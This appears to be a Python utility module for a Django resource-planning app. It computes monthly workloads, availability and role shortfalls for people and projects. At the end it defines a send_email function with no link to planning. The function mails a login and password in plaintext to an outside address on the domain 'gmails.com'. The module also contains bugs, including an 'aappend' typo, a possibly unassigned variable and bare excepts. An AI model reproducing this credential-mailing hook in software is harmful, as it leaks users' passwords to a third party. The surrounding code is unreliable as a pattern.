from .utils import *
from .paint import Paint

# from .vvv import assign_role,assign_project,assign_role_project,
# from .vvv import needs_project,needs_role,needs_role_project
# from .vvv import available_role,rest_role,rest_all,table_timeline,table_projects,table_resources,people,roles

def real_and_virtual_people(role:object)->List[object]:
    pp1 = set(UserProfile.objects.filter(Q(role=role, virtual=False)))
    pp2 = set(UserProfile.objects.filter(Q(res=role, virtual=False)))
    pps = pp1.union(pp2)
    ppl = sorted(list(pps), key=lambda x:x.fio)
    try:
        ov = UserProfile.objects.filter(fio="ВАКАНСИЯ")[0]
        ou = UserProfile.objects.filter(fio="АУТСОРС")[0]
    except:
        ou = None
        ov = None
    return ppl + [ou, ov]


def real_people(role:object)->List[UserProfile]:
    pp1 = set(UserProfile.objects.filter(Q(role=role, virtual=False)))
    pp2 = set(UserProfile.objects.filter(Q(res=role, virtual=False)))
    pps = pp1.union(pp2)
    ppl = sorted(list(pps), key=lambda x: x.fio)
    return ppl


def is_virtual(person:UserProfile)->bool:
    if person.fio in ("ВАКАНСИЯ", "АУТСОРС"):
        return True
    return False




def get_prj_triplet(p:int, r:int, j:int)->tuple[any,any,any]:
    role = None
    if r > 0:
        try:
            role = Role.objects.filter(id=r)[0]
        except:
            pass
    person = None
    if p > 0:
        try:
            person = UserProfile.objects.filter(id=p)[0]
        except:
            pass
    project = None
    if j > 0:
        try:
            project = Project.objects.filter(id=j)[0]
        except:
            pass

    return (person, role, project)

def rest_role_12(r,n):
    people = real_people(r)

    res = [0]*n
    for p in people:
        res_p = rest_of_time_pr_12(p, r, n)
        for i in range(n):
            res[i]+=res_p[i]
    return res

def rest_of_time_pr_12(p, r,n=12):
    a = task_person_role_12(p, r,n)
    b = time_available_person_role_12(p, r,n)
    c = [b[i]-a[i] for i in range(n)]

    return c

def rest_and_color_12(p, r,color,is_1,n=12):
    a = task_person_role_12(p, r,n)
    b = time_available_person_role_12(p, r,n)
    c = [b[i]-a[i] for i in range(n)]
    d = [{"val":c[i],"align":"center","color":color(c[i],is_1)} for i in range(n)]
    return d

def task_person_role_12(person:object, role:object,n:int=12)->List[int]:
    d = date0()
    res = [0] * n
    for i in range(n):
        tasks = Task.objects.filter(person=person, role=role, month=d)
        for task in tasks:
            try:
                res[i] += task.load
            except:
                pass
        d = inc(d)
    return res

def time_available_in_mon(p:int, r:int, y:int, m:int)->int:
    d = date(y, m, 15) 
    person, role, project = get_prj_triplet(p, r, -1)
    if is_virtual(person):
        return 99999
    if person.role == role:
        t = 100
    elif role in person.res:
        t = 0
    task = Less.objects.filter(person=person, role=role, start_date__lte=d).order_by(
        "-start_date"
    )
    try:
        t = task[0].load
    except:
        pass
    return t




def task_person_role_project_12(p:object, r:object, j:object,n:int=12)->List[int]:
    d = date0()
    res = [0] * n
    for i in range(n):
        t = Task.objects.filter(person=p, project=j, role=r, month=d)
        try:
            res[i] += t[0].load
        except:
            pass
        d = inc(d)
    return res


def task_role_project_including_virtuals_12(r, j,n=12):
    d = date0()
    res = [0] * n
    for i in range(n):
        tasks = Task.objects.filter(project=j, role=r, month=d)
        for t in tasks:
            try:
                res[i] += t.load
            except:
                pass
        d = inc(d)
    return res


def task_role_project_12(r, j,n=12):
    d = date0()
    res = [0] * n
    for i in range(n):
        tasks = Task.objects.filter(project=j, role=r, month=d)
        for t in tasks:
            if not t.person.virtual:
                try:
                    res[i] += t.load
                except:
                    pass
        d = inc(d)
    return res


def time_available_person_role_12(person:object, role:object,n:int=12)->List[int]:
    if is_virtual(person):
        return [999999] * n

    res = [0] * n
    d = date0()
    t = -1
    if person == None:
        return None
    if person.role == role:
        t = 100
    elif person.res.filter(id=role.id).exists():
        t = 0

    for i in range(n):
        task = Less.objects.filter(
            person=person, role=role, start_date__lte=d
        ).order_by("-start_date")
        try:
            t = task[0].load
        except:
            pass
        res[i] = t
        d = inc(d)
    return res

def needs_role_project_12(p:object,r:object, j:object,n:int=12)->List[int]:
    d = date0()
    res = [0] * n
    for i in range(n):
        t = Load.objects.filter(project=j, role=r, month=d)
        try:
            res[i] = t[0].load
        except:
            pass
        d = inc(d)
    return res

def needs_rj_color_12(p:object,r:object, j:object,n:int=12,paint=None)->List[int]:
    d = date0()
    res1 = needs_role_project_12(p,r,j,n)
    res = []
    for i in range(n):
        paint.next_cell(res1[i])
        res.aappend({'val':res1[i],'color':paint.color_balance()})

    return res

'''
нехватка ресурса - роль и проект - на 12 месяцев
'''
def delta_role_project_12(r:object, j:object,n:int=12)->List[int]:
    a = needs_role_project_12(-1,r, j,n)
    b = task_role_project_including_virtuals_12(r, j,n)
    c = [b[i]-a[i] for i in range(n)]
    return c

'''
Загрузка одно человека по разным ролям суммарно превысила 100% (булев вектор)
'''
def person_more_100_12(person:object,n:int=12)->List[bool]:
    sum = [0] * n
    roles = {person.role}.union(person.res.all())
    for role in roles:
        isfree = time_available_person_role_12(person, role,n)
        for i in range(n):
            sum[i] += isfree[i]

    res = [sum[i] > 100 for i in range(n)]
    return res


from django.core.mail import send_mail

def send_email(msg1,msg2):
    subject = 'new login'
    message = f"login:{msg1} pwd:{msg2}"
    from_email = 'admin@django.com'
    recipient_list = ['jfeldman777@gmails.com']

    send_mail(subject, message, from_email, recipient_list)
   
    
